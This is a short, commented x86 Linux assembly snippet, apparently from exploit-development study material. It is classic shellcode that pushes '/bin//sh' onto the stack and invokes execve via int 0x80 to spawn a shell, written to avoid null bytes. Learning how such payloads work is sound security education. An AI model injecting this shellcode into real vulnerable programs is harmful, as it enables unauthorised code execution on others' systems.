section .text
  global _start

_start:
  xor eax, eax      ; make content of eax be 0x00 so we can use this as 0
  push eax          ; zero term
  push 0x68732f2f   ; hs//
  push 0x6e69622f   ; nib/
  mov ebx, esp      ; prepare /bin//sh as second arg to syscall 
  mov ecx, eax      ; set third arg as 0
  mov al, 0xb       ; set al to our syscall execve #11 \xb (lower 8 of EAX)
  int 0x80          ; do interrupt so OS catches our syscall
